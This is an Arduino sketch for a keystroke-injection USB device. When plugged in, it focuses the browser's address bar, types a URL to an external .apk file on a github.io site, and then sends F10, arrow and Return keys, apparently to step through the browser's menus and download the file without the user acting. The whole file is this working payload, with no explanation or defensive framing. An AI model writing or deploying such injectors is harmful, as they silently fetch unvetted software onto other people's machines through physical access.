

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(500);
   
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('l');
  Keyboard.releaseAll();

  Keyboard.print("https://vishal-y.github.io/auto-download/1.apk");

  delay(2000);

  typeKey(KEY_F10);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_RETURN);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_RETURN);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_RIGHT_ARROW);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
